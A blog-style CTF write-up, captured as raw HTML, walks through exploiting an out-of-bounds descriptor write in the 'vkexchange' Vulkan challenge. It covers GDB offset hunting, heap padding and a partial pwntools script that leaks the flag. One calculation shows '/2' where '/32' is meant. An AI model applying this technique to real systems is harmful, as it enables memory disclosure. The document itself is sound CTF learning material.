@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Vkexchange :: quixel200</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="i built a stock market exchange using vulkan! but somethings wrong, i can feel it. Files provided:
+settlement.comp vkexchange.c Makefile Dockerfile what the heck is Vulkan? Vulkan is a modern graphics and compute API which provides direct GPU control. Vulkan has the advantage of being fully cross-platform and allows you to develop for Windows, Linux and Android at the same time. The trade-off for these benefits is that every detail related to the graphics API needs to be set up by your application (such as initial frame buffer and memory management).Vulkan Documentation
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://mycatpets.me/writeups/vkexchange/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/code.min.c4581949edab7810737609fc5568852bcd908945f14561e366dcd2300a370545.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/custom.min.1ec33676fa93d9fbcad255742af42410cbba5fc36f0cfae0dc3140fdb1a93870.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/syntax.min.a2cc694a9b481f15d41722bffc2cc54eea4c4f74fd9072b0b33253604c22606e.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/terminal.min.3bad87d960b0dc7ba0cc355b86787cfd54778b1c16b1c0f6a82f685ee01716f7.css">
+
+  
+  <link rel="stylesheet" href="http://mycatpets.me/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://mycatpets.me/favicon.png">
+<link rel="apple-touch-icon" href="http://mycatpets.me/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Vkexchange">
+<meta property="og:description" content="i built a stock market exchange using vulkan! but somethings wrong, i can feel it. Files provided:
+settlement.comp vkexchange.c Makefile Dockerfile what the heck is Vulkan? Vulkan is a modern graphics and compute API which provides direct GPU control. Vulkan has the advantage of being fully cross-platform and allows you to develop for Windows, Linux and Android at the same time. The trade-off for these benefits is that every detail related to the graphics API needs to be set up by your application (such as initial frame buffer and memory management).Vulkan Documentation
+" />
+<meta property="og:url" content="http://mycatpets.me/writeups/vkexchange/" />
+<meta property="og:site_name" content="quixel200" />
+
+  <meta property="og:image" content="http://mycatpets.me/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-04-27 09:21:49 &#43;0530 IST" />
+
+
+
+
+  <link href="/writeups/vkexchange/index.xml" rel="alternate" type="application/rss+xml" title="quixel200" />
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Nyan~
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/articles">Articles</a></li>
+        
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/now">Now</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/articles" >Articles</a></li>
+        
+      
+        
+          <li><a href="/notes" >Notes</a></li>
+        
+      
+        
+          <li><a href="/now" >Now</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+    <div class="index-content">
+      <h3 id="i-built-a-stock-market-exchange-using-vulkan-but-somethings-wrong-i-can-feel-it">i built a stock market exchange using vulkan! but somethings wrong, i can feel it.</h3>
+<p>Files provided:</p>
+<ul>
+<li><a href="/writeups/vkexchange/files/settlement.comp">settlement.comp</a></li>
+<li><a href="/writeups/vkexchange/files/vkexchange.c">vkexchange.c</a></li>
+<li><a href="/writeups/vkexchange/files/Makefile">Makefile</a></li>
+<li><a href="/writeups/vkexchange/files/Dockerfile">Dockerfile</a></li>
+</ul>
+<h1 id="what-the-heck-is-vulkan">what the heck is Vulkan?</h1>
+<p>Vulkan is a modern graphics and compute API which provides direct GPU control. Vulkan has the advantage of being fully cross-platform and allows you to develop for Windows, Linux and Android at the same time. The trade-off for these benefits is that every detail related to the graphics API needs to be set up by your application (such as initial frame buffer and memory management).<a href="https://docs.vulkan.org/tutorial/latest/00_Introduction.html#:~:text=About-,This,behavior,-%2E">Vulkan Documentation</a></p>
+<h3 id="if-vulkan-is-an-api-for-graphics-what-is-it-doing-in-a-stock-market-exchange-program">if Vulkan is an API for Graphics, what is it doing in a stock market exchange program?</h3>
+<p>Well turns out Vulkan can also do maths, way faster than I could ever dream of. It does this using <a href="https://vulkan-tutorial.com/Compute_Shader#:~:text=An%20important%20concept%20introduced%20with%20compute%20shaders%20is%20the%20ability%20to%20arbitrarily%20read%20from%20and%20write%20to%20buffers%2E%20For%20this%2C%20Vulkan%20offers%20two%20dedicated%20storage%20types">Compute Shaders</a>. The author, in his infinite wisdom has decided to use this instead of&hellip; idk&hellip;writing a normal program? (I have no idea how stock market exchange programs work).</p>
+<p>We need to understand some things before we can proceed:</p>
+<ul>
+<li>The storage type that is used in this particular program is a Shader storage buffer object(SSBO). This is what allows the shader to read from and write to a buffer.</li>
+<li>A Descriptor set - Think of a single descriptor as a pointer or a handle to a resource, A VkDescriptorSet is a pack of those pointers that are bound together.(Like a table of contents)</li>
+<li>Descriptor sets can&rsquo;t be created directly, they must be allocated from a pool like <a href="https://docs.vulkan.org/spec/latest/chapters/cmdbuffers.html">command buffers</a>.</li>
+</ul>
+<h1 id="vkexchangec">vkexchange.c</h1>
+<p>I am not going to explain 898 lines of unhinged C code, so I will give a high level overview of the important things and then we can get to the actual vulnerability.</p>
+<p>If we look at the code for <code>init_vulkan()</code>, we notice two things that stand out:</p>
+<ul>
+<li>
+<p><code>features.robustBufferAccess = VK_FALSE;</code> - tells the vulkan driver not to check array bounds when reading or writing memory. That&rsquo;s suspicious.</p>
+</li>
+<li>
+<p>In <code>choose_device()</code> -   <code>bool is_lvp = strstr(props.deviceName, &quot;llvmpipe&quot;) || strstr(props.deviceName, &quot;lavapipe&quot;);</code> - lavapipe and llvmpipe are CPU based, meaning vulkan doesn&rsquo;t use the GPU, but the CPU for this program. Well that&rsquo;s cool.</p>
+</li>
+</ul>
+<h2 id="building-the-exchange">Building the exchange</h2>
+<ul>
+<li><code>host_alloc</code> , <code>host_realloc</code> and <code>host_free</code> allocate everything in a sequential 16MB array called <code>host_arena</code>. This puts all the vulkan objects into a clean, flat memory layout.</li>
+<li><code>create_market_layouts</code> : Defines the rules for the buffers. It says the Quote Book gets 1 slot, Markets get X slots, and the Settlement Book gets 2 slots.</li>
+<li><code>create_settlement_pipeline</code> - loads the <code>settlement.comp</code> shader.</li>
+<li><code>init_resolution</code> - grabs the flag and puts it into the <code>oracle_buf</code> memory.</li>
+<li><code>open_order_books</code> - Creates the descriptor pool and allocates the descriptor set in memory(in this order: <code>quote_book</code> -&gt; <code>markets</code> -&gt; <code>settlement_book</code>)</li>
+</ul>
+<h2 id="user-interface">User interface</h2>
+<ul>
+<li><code>menu_open_account</code> - opens an account, do I really need to explain this?</li>
+<li><code>menu_fund_account</code> - Funding it lets you write hex bytes into it</li>
+<li><code>menu_audit_account</code> - prints the bytes out to the screen</li>
+<li><code>menu_list_market</code> - Allows you to define how many <code>outcome_slots</code> and <code>memo_bytes</code> a new market should have.
+<code>menu_quote_position</code> - allow a user to submit their trading position to a specific index in the public Quote Book</li>
+<li><code>menu_settle</code> - calls <code>ckCmdDispatch</code>, telling the GPU to go brr, or the CPU in this case. (basically executes the copy instruction to copy from OracleBook to ClearingBook)</li>
+</ul>
+<h1 id="settlementcomp">settlement.comp</h1>
+<p>This file is the compute shader, it&rsquo;s written in GLSL (OpenGL Shading Language) and is the code that runs on the GPU.
+When running the Makefile and compiling, the <code>glslangValidator</code> tool translates it into a GPU-readable bytecode format called SPIR-V and packs it into a <code>shader_spv.h</code> header file in the C++ program. Fascinating innit.</p>
+<p><code>layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;</code> - forces the GPU to run this shader on a single threaded.</p>
+<h3 id="push-constants">Push constants</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">layout</span><span class="p">(</span><span class="n">push_constant</span><span class="p">)</span> <span class="n">uniform</span> <span class="n">Push</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">mode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">push</span><span class="p">;</span>
+</span></span></code></pre></div><p>Push Constants are Vulkan&rsquo;s way of sending a tiny amount of data (usually a few bytes) directly to the GPU as fast as possible, without needing to allocate a whole memory buffer.</p>
+<h3 id="the-buffers-ssbos">The Buffers (SSBOs)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">layout</span><span class="p">(</span><span class="n">set</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">binding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">readonly</span> <span class="n">buffer</span> <span class="n">OracleBook</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">oracle_words</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">layout</span><span class="p">(</span><span class="n">set</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">binding</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">writeonly</span> <span class="n">buffer</span> <span class="n">ClearingBook</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">clearing_words</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>The <code>OracleBook</code> is marked readonly and the <code>ClearningBook</code> is writeonly.</p>
+<h3 id="the-main-function">The main function</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">push</span><span class="p">.</span><span class="n">index</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>It first does a bounds check and quits if you ask for an index greater than 64. Because uint is 4 bytes, 64 * 4 = 256 bytes. This limits the settlement to a maximum of 256 bytes of data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">push</span><span class="p">.</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clearing_words</span><span class="p">[</span><span class="n">push</span><span class="p">.</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">oracle_words</span><span class="p">[</span><span class="n">push</span><span class="p">.</span><span class="n">index</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">push</span><span class="p">.</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clearing_words</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">oracle_words</span><span class="p">[</span><span class="n">push</span><span class="p">.</span><span class="n">index</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">push</span><span class="p">.</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clearing_words</span><span class="p">[</span><span class="n">push</span><span class="p">.</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">push</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>In the C code, push.mode is harcoded to 0, so only the first condition is executed. It just copies the stock price from OracleBook buffer into the ClearingBook buffer for payout.</p>
+<h1 id="the-vulnerability">The vulnerability</h1>
+<p>The vulnerability is a OOB(Out Of Bounds) Write in <code>menu_quote_position()</code>, let&rsquo;s trace it step by step.</p>
+<p>It first asks you for the <code>price_index</code>,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="nf">ask_u64</span><span class="p">(</span><span class="s">&#34;price_index: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="n">MIN_PRICE_INDEX</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="n">MAX_PRICE_INDEX</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// MIN_PRICE_INDEX = 32768 and MAX_PRICE_INDEX = 300000
+</span></span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;bad price index&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It then passes this index to a helper function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">update_storage_desc</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">app</span><span class="o">-&gt;</span><span class="n">quote_book</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">idx</span><span class="p">,</span> <span class="n">b</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">range</span><span class="p">);</span>
+</span></span></code></pre></div><p>inside <code>update_storage_desc</code>, it formats a VkWriteDescriptorSet and fires it at the vulkan driver.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">  <span class="n">VkWriteDescriptorSet</span> <span class="n">write</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">sType</span> <span class="o">=</span> <span class="n">VK_STRUCTURE_TYPE_WRITE_DESCRIPTOR_SET</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">dstSet</span> <span class="o">=</span> <span class="n">set</span><span class="p">,</span> <span class="c1">// quote_book 
+</span></span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">dstBinding</span> <span class="o">=</span> <span class="n">binding</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">dstArrayElement</span> <span class="o">=</span> <span class="n">array_elem</span><span class="p">,</span> <span class="c1">// The index we passed
+</span></span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">descriptorCount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">descriptorType</span> <span class="o">=</span> <span class="n">VK_DESCRIPTOR_TYPE_STORAGE_BUFFER</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="n">pBufferInfo</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">,</span> <span class="c1">// our account buffer
+</span></span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vkUpdateDescriptorSets</span><span class="p">(</span><span class="n">app</span><span class="o">-&gt;</span><span class="n">device</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">write</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span></code></pre></div><p>So it&rsquo;s writing the address of our account to <code>quote_book</code>.
+But if we look at the layout for <code>quote_book</code> created back in <code>create_market_layouts</code>, its defined as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">   <span class="n">VkDescriptorSetLayoutBinding</span> <span class="n">quote_bindings</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="n">binding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="n">descriptorType</span> <span class="o">=</span> <span class="n">VK_DESCRIPTOR_TYPE_STORAGE_BUFFER</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="n">descriptorCount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="c1">// only 1 slot
+</span></span></span></code></pre></div><p>The <code>quote_book</code> only has 1 descriptor(index 0) so when we provide a large index, anything other than 0, it does the following:
+<code>destination_mem = address_of_quote_book + (index * size_of_descriptor(32 bytes))</code></p>
+<p>well that doesn&rsquo;t sound good&hellip;
+This means that we can write the address of our account&hellip; but where?</p>
+<h1 id="we-can-write-now-what">We can write! now what?</h1>
+<p>Remember that the descriptors are allocated in this order:
+<code>quote_book</code> -&gt; <code>markets</code> -&gt; <code>settlement_book</code></p>
+<p>We can just hijack the <code>clearing_buf</code>(which is in <code>settlement_book</code>) pointer and have it point to our account.</p>
+<p>We can read bytes from our account using <code>menu_audit_account</code>. and the flag(which is on <code>oracle_buf</code>) is copied to <code>clearing_buf</code> when <code>settlement.comp</code> is triggered, making it our perfect target.</p>
+<h1 id="gdb-my-beloved">GDB my beloved</h1>
+<p>For this, we first need to cacluate the offset and the index we need to provide in order to write the address to the correct place. In other words we need to find the distance between <code>quote_book</code> and <code>settlement_book</code>.</p>
+<p>In order to hook up GDB and get it working, I had to make some changes to the <code>Dockerfile</code> as well as the <code>Makefile</code></p>
+<h3 id="in-the-makefile">in the Makefile:</h3>
+<pre tabindex="0"><code>CFLAGS += -std=c11 -Wall -Wextra -Wpedantic -D_FORTIFY_SOURCE=2 -g
+# ...
+strip: $(TARGET)
+	# strip $(TARGET)
+</code></pre><p>comment out the strip command, and add <code>-g</code> to the compilation flag to compile it with debug symbols.</p>
+<h3 id="in-the-dockerfile">in the Dockerfile:</h3>
+<ul>
+<li>Add GDB to the apt-get run command.</li>
+<li>remove <code>&amp;&amp; strip ./vkexchange</code> in the build step.</li>
+</ul>
+<p>Next, we build the docker container,</p>
+<pre tabindex="0"><code>docker build --target app -t vk-debug .
+</code></pre><p>Let&rsquo;s run this container and get a shell so that we can run <code>gdb ./vkexchange</code> and debug the offset we need.</p>
+<pre tabindex="0"><code>docker run --rm -it --privileged vk-debug /bin/bash
+</code></pre><p>Let&rsquo;s run the binary, create an account, create a market with 32768 to satisfy the index requirements of <code>menu_quote_position</code> and open the exchange</p>
+<p>We can then interrupt the program, go up the stack frame back to main, and then print the addresses we want.</p>
+<p><img src="/writeups/vkexchange/images/calculating_offsets.jpg" alt="calculating offsets"></p>
+<pre tabindex="0"><code>(gdb) p/x app.quote_book
+$1 = 0x555555655fa0
+(gdb) p/x app.settlement_book
+$2 = 0x555555756098
+</code></pre><p>doing some simple maths,</p>
+<p><code>0x555555756098 - 0x555555655fa0 = 1048824</code></p>
+<p>That is the distance to the start of the <code>settlement_book</code>. But remember, the <code>settlement_book</code> has two bindings: <code>OracleBook</code> at index 0, and <code>ClearingBook</code> at index 1. Since each descriptor in lavapipe is exactly 32 bytes long, we need to add 32 bytes to reach the <code>ClearingBook</code>, which gives us <code>1048824 + 32 = 1048856</code></p>
+<p>Now we just divide by 32 since each index is multiplied by 32 annnddd we get,</p>
+<p><code>1048856/32 = 32776.75 </code>, huh&hellip;</p>
+<p><img src="/writeups/vkexchange/images/this-is-fine.gif" alt="this-is-fine.gif"></p>
+<p>We can&rsquo;t just provide 32776 as we would be off by 24 bytes from where we want to be. So what do we do?</p>
+<h1 id="heap-shenanigans">Heap Shenanigans</h1>
+<p>All this data is stored on the heap, so let&rsquo;s try to shift the heap a little so that we somehow get a distance that is perfectly divisible by 32.
+We can do this by creating tiny markets that act as padding</p>
+<ul>
+<li>A market descriptor set header: 88 bytes</li>
+<li>1 outcome slot (the descriptor): 32 bytes.</li>
+<li>Total size of a 1-slot market: 120 bytes</li>
+</ul>
+<p>So everytime we call <code>menu_list_market</code>, we push <code>settlement_book</code> 120 bytes further down the heap.</p>
+<p>Add 1 Market: 24 + 120 = 144 bytes. (144 % 32 != 0)
+Add 2 Markets: 24 + 240 = 264 bytes. (264 % 32 != 0)
+Add 3 Markets: 24 + 360 = 384 bytes. (384 % 32 == 0) !!!</p>
+<p>by allocating 3 markets, we can fix the alignment issue, so our new total distance is <code>1048856 + 360 = 1049216</code></p>
+<p><code>1049216/2 = 32788</code></p>
+<p>Perfect!</p>
+<h1 id="the-holy-sequence">The holy sequence</h1>
+<ul>
+<li>Create an account.</li>
+<li>create the primary market that satisfies the index requirements (32768).</li>
+<li>Create 3 tiny markets to shift the heap and align the address properly.</li>
+<li>arm the exchange . (calls <code>open_order_books</code> which builds the descriptor pool and loads the flag into memory)</li>
+<li>Provide the index to <code>quote_position</code>. (overwrite ClearingBook with our account address)</li>
+<li>settle round 0, (read 4 bytes of flag and put it into our account buffer).</li>
+<li>audit the aaccount (read the leak).</li>
+</ul>
+<p><img src="/writeups/vkexchange/images/flag.jpg" alt="flag!!!"></p>
+<p>What&rsquo;s that? That&rsquo;s the hex bytes of <code>UMDC</code>.</p>
+<p>Now we just need to script this and leak the rest of the flag. Final exploit script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challs.umdctf.io&#39;</span><span class="p">,</span> <span class="mi">30305</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_cmd</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Open account</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bytes: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4096&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;account: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># List markets (need 32768 total slots + extra to get right offset)</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;outcome_slots: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32768&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;memo_bytes: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;outcome_slots: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;memo_bytes: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Open exchange</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_cmd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;exchange open</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># OOB hijack</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_cmd</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;price_index: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32788&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;account: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
